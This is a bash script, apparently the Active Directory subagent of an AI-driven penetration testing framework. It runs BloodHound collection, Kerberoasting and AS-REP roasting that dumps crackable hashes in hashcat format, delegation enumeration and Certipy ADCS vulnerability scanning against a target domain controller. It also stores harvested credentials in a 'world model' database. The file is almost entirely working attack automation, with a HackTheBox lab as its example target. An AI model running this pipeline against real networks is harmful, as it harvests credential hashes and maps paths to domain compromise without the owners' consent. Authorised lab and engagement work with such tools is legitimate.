#!/usr/bin/env bash
set -euo pipefail

# TAR AD Subagent — Active Directory enumeration pipeline.
# Runs BloodHound collection + targeted AD queries.
#
# Usage: ad-agent.sh <target_ip> <domain> <username> <password> <engagement_dir>
# Example: ad-agent.sh 10.10.11.50 corp.htb user pass /home/kali/engagements/htb-box

TARGET_IP="${1:?Usage: ad-agent.sh <target_ip> <domain> <username> <password> <engagement_dir>}"
DOMAIN="${2:?Missing domain}"
USERNAME="${3:?Missing username}"
PASSWORD="${4:?Missing password}"
ENG_DIR="${5:?Missing engagement dir}"
WM_DB="$ENG_DIR/world_model.db"
LOGS_DIR="$ENG_DIR/subagent_logs"
PARSERS="/home/kali/.claude/scripts/parsers"
BH_DIR="$ENG_DIR/bloodhound"

mkdir -p "$LOGS_DIR" "$BH_DIR"
TIMESTAMP=$(date +%s)
LOG_FILE="$LOGS_DIR/ad-${TIMESTAMP}.json"

echo "[ad-agent] Starting AD enumeration: $DOMAIN via $TARGET_IP"

# ── Phase 1: BloodHound collection ───────────────────────────
echo "[ad-agent] Phase 1: BloodHound collection..."
bloodhound-python -c all \
    -u "$USERNAME" -p "$PASSWORD" \
    -d "$DOMAIN" -dc "$TARGET_IP" -ns "$TARGET_IP" \
    --zip -o "$BH_DIR" 2>/dev/null || true

# Parse BloodHound data
python3 "$PARSERS/bloodhound_parser.py" \
    --dir "$BH_DIR" --db "$WM_DB" 2>/dev/null || true

# ── Phase 2: Kerberoasting ───────────────────────────────────
echo "[ad-agent] Phase 2: Kerberoasting..."
KERB_OUT=$(mktemp)
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$TARGET_IP" -request 2>/dev/null > "$KERB_OUT" || true

if [ -s "$KERB_OUT" ]; then
    python3 "$PARSERS/impacket_parser.py" \
        --tool kerberoast --db "$WM_DB" "$KERB_OUT" 2>/dev/null || true
fi
rm -f "$KERB_OUT"

# ── Phase 3: AS-REP Roasting ─────────────────────────────────
echo "[ad-agent] Phase 3: AS-REP Roasting..."
ASREP_OUT=$(mktemp)
impacket-GetNPUsers "$DOMAIN/" \
    -dc-ip "$TARGET_IP" -usersfile <(
        # Get user list from world_model
        python3 -c "
import sys
sys.path.insert(0, '/home/kali/.claude/scripts')
from world_model import WorldModel
wm = WorldModel('$WM_DB')
for row in wm.conn.execute('SELECT username FROM users'):
    print(row[0])
wm.close()
" 2>/dev/null || true
    ) -format hashcat 2>/dev/null > "$ASREP_OUT" || true

if [ -s "$ASREP_OUT" ]; then
    python3 "$PARSERS/impacket_parser.py" \
        --tool asreproast --db "$WM_DB" "$ASREP_OUT" 2>/dev/null || true
fi
rm -f "$ASREP_OUT"

# ── Phase 4: Delegation enumeration ──────────────────────────
echo "[ad-agent] Phase 4: Delegation check..."
DELEG_OUT=$(mktemp)
impacket-findDelegation "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$TARGET_IP" 2>/dev/null > "$DELEG_OUT" || true

if [ -s "$DELEG_OUT" ]; then
    python3 "$PARSERS/impacket_parser.py" \
        --tool find_delegation --db "$WM_DB" "$DELEG_OUT" 2>/dev/null || true
fi
rm -f "$DELEG_OUT"

# ── Phase 5: ADCS enumeration ────────────────────────────────
echo "[ad-agent] Phase 5: ADCS check..."
certipy find -u "$USERNAME@$DOMAIN" -p "$PASSWORD" \
    -dc-ip "$TARGET_IP" -vulnerable \
    -output "$ENG_DIR/certipy_output" 2>/dev/null || true

# ── Build summary ────────────────────────────────────────────
SUMMARY=$(python3 -c "
import sys, json
sys.path.insert(0, '/home/kali/.claude/scripts')
try:
    from world_model import WorldModel
    wm = WorldModel('$WM_DB')
    users = wm.conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    creds = wm.conn.execute('SELECT COUNT(*) FROM creds').fetchone()[0]
    findings = wm.conn.execute('SELECT COUNT(*) FROM findings').fetchone()[0]
    wm.close()
    print(json.dumps({'users': users, 'creds': creds, 'findings': findings, 'domain': '$DOMAIN'}))
except Exception as e:
    print(json.dumps({'error': str(e)}))
" 2>/dev/null || echo '{"error": "world_model unavailable"}')

printf '%s\n' "$SUMMARY" > "$LOG_FILE"

echo "[ad-agent] Complete. $SUMMARY"
